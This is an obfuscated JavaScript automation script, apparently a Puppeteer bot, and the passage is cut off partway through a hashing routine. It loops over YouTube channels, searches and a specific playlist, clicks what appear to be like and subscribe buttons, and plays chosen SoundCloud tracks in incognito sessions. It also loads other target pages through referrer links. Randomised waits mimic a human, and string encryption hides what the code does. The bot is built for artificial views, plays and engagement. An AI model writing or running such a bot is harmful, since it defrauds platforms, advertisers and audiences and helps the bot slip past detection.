const a1 = d,
  a0 = c,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x940 + -0x15e4 + 0x27 * 0x53))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x170a + 0x1bfa + -0x1 * 0x4f0), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x43 * 0x35f + 0x614b + -0xcdf8 + (0x58 * -0x91 + -0xc * 0x683 + 0xba94) * random()) : await standardWaitForNetIdle(f), await wait(-0x416 * 0x1 + -0x2 * -0xbe5 + 0xb * -0x4 + (0x4497 + -0x66 * -0x54 + -0x1 * 0x3eff) * random()), -0x2 * -0x7b4 + 0x832 + -0x1799;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xf82 * 0x2 + 0x47 * -0x7a + 0x5462), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x963 + 0xcae + 0x1a5 * -0x2;
}
async function randomWait() {
  return await wait(-0x8 * 0x191 + 0x1346 + 0xcca + (0x244b + 0x1c30 + -0x1 * 0x2cf3) * random()), 0x20e9 + 0x1f6e + 0xa * -0x66f;
}
async function watchRandomFrontScreenVideo(f) {
  const R = b;
  await f[R(0x8, '%tF6')](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1 * -0x2a5 + 0x1 * -0x1273 + 0xfce, 0x16e9 + 0x1baa + -0x328c), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x14077 * -0x1 + -0x116d1 + -0x7718 * -0x7) * getRandomInt(0x1316 + 0xac5 * 0x3 + -0xf * 0x36d, -0x5 * -0x6d5 + 0x6f2 + -0x2916), h)), 0x47 * -0x1 + 0x21a8 + -0x2160;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1132 + 0x1c2f + -0x61 * 0x1d;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x57a + -0x1800 + -0x1 * -0x1d7b]['split']('\x20');
    for (let k = -0x7 * 0x7b + 0x1 * -0x15bc + 0x1919; k < i['length']; k += 0x41d + 0xb * -0x19b + -0x1 * -0xd8e)
      j += i[k] * h[i[k + (-0xf45 + -0xaec + 0x3be * 0x7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1c97 + -0x33e + 0x1fdb)['map'](l => Array['from'](l['children']))['flat'](0x17 * 0x59 + -0x3e3 + -0x41b * 0x1)['map'](l => l['childNodes'][-0x110a + 0x106 + 0x1005]['childNodes'][0x68 * 0x57 + -0x1334 + -0x1024]['childNodes'][-0xc6f + -0xb7 + -0x25 * -0x5b]['childNodes'][-0xaff + 0xf5 + 0xa0a]['childNodes'][0x25df + 0x2531 + -0x4b0f]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j[S(0x4)](l => l['href']);
  }), await wait(getRandomInt(0x19a9 + -0x104c + -0x575, 0xd0f + -0x4d * -0x1 + 0x62c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x646 + 0x21e * -0xd + 0x5c64);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1bb41 + 0x274e + -0x27e53 * -0x1) * getRandomInt(0x1 * -0x18d4 + -0x26f9 + 0x3fcf, -0x650 * 0x3 + 0x1 * -0x514 + 0x1 * 0x1809), h);
  return await wait(i), -0x1 * 0x191c + 0x24e1 * -0x1 + 0x3dfe;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1195 * -0x2 + -0x1 * -0x163d + -0x3967);
    let h = e[f];
    if (c['GjZQNR'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x15ff + -0x1 * -0x2487 + 0x8 * -0x1d1, r, s, t = -0xda * -0x27 + -0x185 * -0x5 + -0x28cf; s = m['charAt'](t++); ~s && (r = q % (-0x332 * 0x6 + -0x1 * -0x248e + -0x115e) ? r * (0x7 * 0x2cf + 0x3 * -0xb5 + -0x114a) + s : s, q++ % (-0x342 + 0x1 * -0x109d + -0x3 * -0x6a1)) ? o += String['fromCharCode'](0x1 * -0x111b + -0x416 + -0x2 * -0xb18 & r >> (-(0x29 * 0x68 + 0x19a3 + -0x1b1 * 0x19) * q & 0x8 * 0x8c + -0x2 * 0x9b8 + 0xf16)) : -0x225 + -0xf82 * 0x2 + 0xd * 0x28d) {
          s = n['indexOf'](s);
        }
        for (let u = -0x4f5 * 0x1 + -0x963 + 0x99 * 0x18, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x8 * 0x191 + 0x1346 + -0x6ae))['slice'](-(0x244b + 0x1c30 + -0x1 * 0x4079));
        }
        return decodeURIComponent(p);
      };
      c['aSRnYV'] = i, b = arguments, c['GjZQNR'] = !![];
    }
    const j = e[0x20e9 + 0x1f6e + 0x7 * -0x931],
      k = f + j,
      l = b[k];
    return !l ? (h = c['aSRnYV'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x37 * 0x77 + 0x52 * -0x19 + 0x5 * -0x383]['children'][-0x720 + 0xe22 + 0x1a * -0x45]['children'][-0x1 * -0x24f6 + 0x117f * 0x1 + -0x3675]['children'][-0x7 * -0x3e6 + 0x11 * 0x21a + -0x3f04]['children'][-0x1 * -0x214c + -0x792 + -0x2 * 0xcdd]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0xb * 0x239 + 0x1 * -0x199e + -0x1 * -0x3212;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1363 + -0xbc * -0xa + -0x265 * 0xb + (0x21 * 0x5c + 0x1a65 + -0x260f) * random()
  }), await wait(-0x1 * -0xb9a + -0xc53 + 0x2ad + (0x5b1 * -0x3 + 0x745 * -0x1 + 0x1984) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const T = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xc16 + -0x3 * 0x8 + -0x2 * -0x618]['childNodes'][-0x4c0 + 0x1 * -0xa39 + -0x1b * -0x8e]['childNodes'][0x1dd1 + -0x162e + -0x7a2]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x94 * -0x2a + -0x2093 + 0x28 * 0x16c][T(0x15)][-0x23b6 + 0x1f63 * 0x1 + 0x453]['childNodes'][-0x2 * -0x108d + -0x5 * 0x499 + 0xa1b * -0x1]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x37 + 0x1a1c + 0x4 * -0x679),
          r = 0xa53 + 0x1c3 + -0x2 * 0x60b;
        for (let u = 0xd2b + -0x2575 + 0x1 * 0x184a; u < q['length']; u += 0xb + -0x2104 + 0x1 * 0x20fb)
          r += q[u] * k[q[u + (-0xd9 * 0x29 + 0x1517 + -0x1 * -0xdab)]];
        return r;
      }(n);
  });
  await wait((-0x7 * -0xf5b + 0x6a23 + -0x9b08) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x1919 + 0x3521 * -0x1 + 0x1389a) * getRandomInt(0x23da * -0x1 + 0x194a + 0x21d * 0x5, 0x6e6 + -0xd12 + 0x636), h + (-0x1 * 0x16b8 + 0x1 * 0x25f2 + 0x44e));
  return await wait(i), 0x1a5b * 0x1 + 0x202a + -0x3a84;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x6cc + -0x1492 + -0x2 * -0x6e3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const U = d;
        document[U(0x16) + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x523 * 0x4 + -0x4e + 0x2 * 0x1049 + (0x62a + 0x197a + -0x1bbc) * Math['random']());
    });
  }, 0xcc4 + -0x28 * 0xe4 + 0x3234);
  await wait(-0x35ce * -0x3 + 0x1 * 0x8c10d + -0x4ce97);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x4c07 + -0x1a521 * -0x1 + -0x4 * 0x41b2) * getRandomInt(0x1 * 0x1553 + 0x1cf1 + -0x648 * 0x8, -0x1e0c + 0xa61 + 0x13c4)), clearInterval(h), -0xaa * -0x2b + 0x48b * 0x6 + -0x37cf;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x1 * 0x18c1 + 0x1 * -0xb3 + 0x1 * -0x180e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1ff2 + -0x1951 * -0x1 + 0x6a2;
    await randomWait();
  }
  return -0xd46 + 0x1 * -0x435 + 0x117c;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1195 * -0x2 + -0x1 * -0x163d + -0x3967);
    let h = e[f];
    if (b['RhXVwH'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x15ff + -0x1 * -0x2487 + 0x8 * -0x1d1, s, t, u = -0xda * -0x27 + -0x185 * -0x5 + -0x28cf; t = n['charAt'](u++); ~t && (s = r % (-0x332 * 0x6 + -0x1 * -0x248e + -0x115e) ? s * (0x7 * 0x2cf + 0x3 * -0xb5 + -0x114a) + t : t, r++ % (-0x342 + 0x1 * -0x109d + -0x3 * -0x6a1)) ? p += String['fromCharCode'](0x1 * -0x111b + -0x416 + -0x2 * -0xb18 & s >> (-(0x29 * 0x68 + 0x19a3 + -0x1b1 * 0x19) * r & 0x8 * 0x8c + -0x2 * 0x9b8 + 0xf16)) : -0x225 + -0xf82 * 0x2 + 0xd * 0x28d) {
          t = o['indexOf'](t);
        }
        for (let v = -0x4f5 * 0x1 + -0x963 + 0x99 * 0x18, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x8 * 0x191 + 0x1346 + -0x6ae))['slice'](-(0x244b + 0x1c30 + -0x1 * 0x4079));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x20e9 + 0x1f6e + 0x7 * -0x931,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1 * -0x2a5 + 0x1 * -0x1273 + 0xfce; u < 0x16e9 + 0x1baa + -0x3193; u++) {
          p[u] = u;
        }
        for (u = 0x81 * -0x35 + -0x173c + -0x31f1 * -0x1; u < 0x1316 + 0xac5 * 0x3 + -0x61 * 0x85; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x5 * -0x6d5 + 0x6f2 + -0x281b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x47 * -0x1 + 0x21a8 + -0x2161, q = -0x1132 + 0x1c2f + -0x61 * 0x1d;
        for (let v = -0x57a + -0x1800 + -0x4d * -0x62; v < n['length']; v++) {
          u = (u + (-0x7 * 0x7b + 0x1 * -0x15bc + 0x191a)) % (0x41d + 0xb * -0x19b + -0x4 * -0x3a3), q = (q + p[u]) % (-0xf45 + -0xaec + 0x1b31 * 0x1), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1c97 + -0x33e + 0x20d5)]);
        }
        return t;
      };
      b['JHFXXA'] = m, c = arguments, b['RhXVwH'] = !![];
    }
    const j = e[0x17 * 0x59 + -0x3e3 + -0x41c * 0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['LwdpXy'] === undefined && (b['LwdpXy'] = !![]), h = b['JHFXXA'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function fetchRandomSC() {
  const W = d,
    V = b;
  return Math['random']() <= 0x1 * 0xf40 + 0x71e + -0x165e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + V(0x22, 'Ru2r') + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1671 + 0x2693 + 0x2 * -0x811 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + V(0x12, 'etg&') + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + V(0x1, 'OcO)') + 'ext&utm_ca' + W(0x19) + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1195 * -0x2 + -0x1 * -0x163d + -0x3967);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    const X = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * 0x969 + -0x1b1a + 0x2483 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xbf5 + 0x1 * -0x6f3 + 0xdc * 0x16;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x55d * 0x1 + 0x31 * -0x577 + 0xdb19 * 0x2 + getRandomInt(-0x1 * 0x43ea + -0x1 * -0x2857 + 0x562b, -0xc115 * -0x1 + -0x67ba * -0x1 + -0xb39f));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1b * -0xd9 + -0x129a + -0x448), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x131 + -0x1 * -0x70a + 0x3 * -0x1f3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x53 * 0x9 + -0x1c1 * -0xe + 0xbf * -0x1d, -0x1 * -0x14b + -0x15eb + 0x14d2)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1113 + -0x307 + 0x2 * 0xdf5 + floor((0x2443 * 0x1 + 0x8b0 + -0x290b) * random()))), log('p2'), log(await s[X(0x6)](() => {
        const Y = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + Y(0x9))['split'](''), x = [
          -(-0x8bbe5e74 + -0x37c7f324 + 0x48 * 0x47e4f5b),
          0x1dac52 + -0x5604f7 + 0xb858a5,
          -0x7 * -0x1b43 + 0x5232 + -0x9107,
          0x4 * 0x44f + 0x26b * 0x7 + -0x4cf * 0x7
        ], y = [
          0x1c * -0x2d + -0x16f * 0x13 + 0x1 * 0x2041,
          -0x5 * -0x350 + -0x5c8 + -0xab8,
          0xd96 + 0xd * -0x152 + 0x15 * 0x2c,
          -0x1bb9 * -0x1 + 0x1073 + -0x2c2c
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x4 * 0x392 + 0x381 + 0x8 * -0x239)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x3 * -0x9e9 + 0x409 + -0x21c4; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x9b * 0x40 + 0x168b + 0x1035) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * 0x1cc6 + 0x1 * 0x2519 + -0x41df] = A[0x7be + 0x1de4 + -0xe5 * 0x2a] = A[0x1166 + -0x47 * -0x65 + -0x2d68] = A[0x7be + -0x1417 + 0xc5b] = A[0x1520 + -0x826 + 0x1 * -0xcf7] = A[-0x42b * 0x4 + 0x3 * 0x76d + -0x597] = A[-0x17d4 + 0xadd + 0xcfc] = A[-0x15d1 + -0x2180 + 0x3757] = A[0x5c * -0xd + -0xa7 * -0x17 + -0xa4e] = A[-0x1 * 0x202a + 0x1 * 0xb47 + -0x11 * -0x13b] = A[0x33 + 0x2570 + -0x1 * 0x259a] = A[-0x1 * -0x1115 + -0x2632 + -0x43b * -0x5] = A[-0x1 * 0x20b0 + -0x2588 + -0x4643 * -0x1] = A[0x6 * 0x9 + 0xf8d * 0x1 + -0xfb7] = A[0x1610 + -0x18c0 + -0x1 * -0x2bd] = A[0x1b4c + 0x1b * 0xcf + -0x3113] = A[0xc7 * -0xf + -0x12a5 + -0xa1f * -0x3] = 0x7b + 0xcee * -0x1 + -0x1 * -0xc73, this['blocks'] = A) : this['blocks'] = [
                0xc11 + 0x288 * -0x3 + 0x5 * -0xe5,
                -0x1ecd + -0x22b9 * -0x1 + -0x1f6 * 0x2,
                -0x3 * 0x2a1 + 0x59d * 0x2 + -0x1 * 0x357,
                0x2239 + 0x1753 + -0x398c,
                0x1 * -0xcb6 + -0x5 * -0x39a + -0x54c,
                -0x2 * 0xfa3 + -0x14e7 * 0x1 + 0x342d,
                -0x1a9a + 0x271 * 0xd + -0x523,
                0x2 * -0x1115 + -0x1143 + -0x336d * -0x1,
                0x1d7b + -0x1 * -0x1a2a + -0x37a5,
                -0x131f + 0x369 * 0x9 + -0xb92,
                -0x97b + 0x2c * -0xcf + 0x5 * 0x903,
                0x21e6 + -0x146 * 0x2 + -0x1f5a * 0x1,
                0x2b1 * 0x3 + -0x21e9 + 0x19d6,
                0x2120 + -0x267d + -0x55d * -0x1,
                -0xf16 + -0x4 * -0x3d3 + -0x12 * 0x3,
                -0x109d * 0x1 + -0x16d5 + -0x396 * -0xb,
                -0x4 * -0x91e + -0x1c18 + -0x860
              ], this['h0'] = 0x210b3f7a + -0x27ff * -0x3199 + 0x5f3414 * 0xa8, this['h1'] = 0x735b4029 * -0x3 + 0x32f * -0x791b3f + 0x5 * 0xc2490851, this['h2'] = 0x1c6 * 0x276a76 + -0x7ecc2 * 0x84f + -0x2978a * -0x395c, this['h3'] = 0xf7fe21e + 0x1d4507fc + -0x1fc * 0xe6617, this['h4'] = -0x6257a124 + 0xd25db * 0xf07 + 0x6096a517, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x5 * 0x5f + 0x1 * 0x269f + -0x287a, this['finalized'] = this['hashed'] = -0x12f6 + 0xea0 + 0x456, this['first'] = 0x2 * 0x11db + 0xf30 + -0x32e5;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x2d * 0xc2 + -0xa4b + -0x17cf, O = J['length'] || -0x2161 + 0xb * 0x100 + 0x1661, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x14d6 + -0x535 * 0x5 + 0x2edf, P[0xb57 + 0x74d + 0x12a4 * -0x1] = this['block'], P[0x696 + 0x24b * -0x3 + 0x5b] = P[-0x2 * 0x941 + 0xd02 + -0x581 * -0x1] = P[-0xeb9 * 0x1 + -0x1a28 + 0x28e3] = P[-0xe8 * -0x1 + -0x3e6 + 0x301] = P[0x18d9 * 0x1 + 0x3 * 0xa85 + -0x3864] = P[-0x2245 + 0x1d0b * -0x1 + -0x1f * -0x20b] = P[-0x2 * -0xace + -0x2565 + 0xfcf] = P[-0x23 * 0xe5 + 0x304 * -0x9 + 0x3a7a] = P[-0x2003 + 0x74 * 0x19 + 0x14b7 * 0x1] = P[-0x2eb * 0xb + 0x120b + 0xe17] = P[0x7b8 + -0x57a + -0x234] = P[-0x14e3 + -0x29e * -0xb + -0x7dc] = P[-0x228e * 0x1 + -0x1f9b + 0x4235] = P[0x13fc + 0x4b * 0x76 + -0x3681] = P[-0x1d8d + -0x2 * -0xa9b + -0x865 * -0x1] = P[0x6dd + -0x1dea + 0x22 * 0xae] = -0x1a1 + -0x232f + -0x24d * -0x10), K) {
                    for (N = this['start']; M < O && N < 0x14c9 * 0x1 + -0x1 * 0x451 + -0x1038; ++M)
                      P[N >> 0x18c8 * -0x1 + -0x8c2 + 0x1c4 * 0x13] |= J[M] << y[-0x1 * 0x2614 + -0x1 * 0x1337 + 0x6 * 0x98d & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x195f * 0x1 + 0x1 * -0x2089 + 0x3a28; ++M)
                      (L = J['charCodeAt'](M)) < 0xd * 0x2c6 + 0x2389 + -0x4717 ? P[N >> -0x73 + 0x233a + -0x22c5] |= L << y[0x704 + -0xc5b + 0x55a & N++] : L < 0xfdb + -0x27 * 0x80 + 0xba5 ? (P[N >> 0xc69 + 0x23ba + -0x3021] |= (-0x1 * 0xff7 + 0x24f5 + -0x143e | L >> 0x1 * 0xe3f + 0x4 * 0x170 + -0x13f9 * 0x1) << y[0x2 * 0x11fb + -0x1174 * -0x2 + 0x671 * -0xb & N++], P[N >> -0xbe3 + -0x335 + 0xf1a] |= (-0x5c4 * -0x4 + 0x3 * 0xa34 + -0x352c | -0x20da + 0x10 * 0x101 + 0x1109 * 0x1 & L) << y[0x2381 + -0x184d + -0xb31 & N++]) : L < 0x2c89 + 0xa9f * -0x8 + -0x1006f * -0x1 || L >= -0x4097 + -0x1bc79 + 0x10 * 0x2dd1 ? (P[N >> 0x1938 + 0x1fe8 + 0x1c8f * -0x2] |= (0xc76 + -0x230 + -0x966 | L >> -0xd7a + -0x166d + 0x23f3) << y[-0x226a + -0x26e3 + 0x4950 & N++], P[N >> -0x1697 + 0x1482 + 0x217] |= (0x182a + 0x935 + -0x20df | L >> 0xa2c + 0x553 * -0x7 + 0x1b1f & 0x16a2 + 0x962 + -0xa97 * 0x3) << y[0x3d6 + 0x1f6d + -0x2340 & N++], P[N >> -0x25e1 * 0x1 + -0x49e + -0x1f * -0x15f] |= (-0x4cc + 0x1e3 * 0xe + -0x151e | -0x21ea + 0x220f + 0x1a & L) << y[0x1f9a + 0x1649 + -0x35e0 & N++]) : (L = 0x9 * 0x106d + -0x139eb + 0x1a616 + ((0xd * 0x2b + -0x1525 + 0x16f5 & L) << 0x1c88 + -0x1597 + 0x24d * -0x3 | -0x1296 + 0x7f0 + -0xa3 * -0x17 & J['charCodeAt'](++M)), P[N >> 0x4 * -0x96b + -0x1a8b + 0x4039] |= (0x131e * 0x1 + -0x17 * -0xd3 + -0x1 * 0x2523 | L >> 0xc7 * 0x20 + 0x1ab * -0x6 + -0xecc) << y[0x1517 * -0x1 + -0x98f + 0x2f * 0xa7 & N++], P[N >> 0x1 * 0x355 + -0xc73 * -0x1 + -0xfc6] |= (0x1bb5 * 0x1 + -0xa72 + -0x10c3 | L >> -0x1cf1 * -0x1 + -0x1266 + -0xa7f & 0x6d2 + -0x6e * -0x1d + -0xb * 0x1bb) << y[-0x18 * -0x1c + 0x4 * -0x314 + 0x9b3 & N++], P[N >> 0x200 + 0x155b + 0x1 * -0x1759] |= (-0x150f + -0x1 * 0x1213 + 0x27a2 | L >> 0x1 * 0xa9e + -0xa52 * 0x3 + 0x145e & -0x14d4 + -0x7a * 0x40 + 0x3393) << y[0x682 + -0x1 * -0xe91 + 0x1 * -0x1510 & N++], P[N >> 0xf4 * 0x5 + 0x51d + 0x1 * -0x9df] |= (0x11f9 + 0x9d6 * -0x1 + 0x17 * -0x55 | -0x1114 + 0x3a * 0x83 + 0x1 * -0xc5b & L) << y[0x1eed + 0x1 * 0x28d + -0x2177 & N++]);
                  }
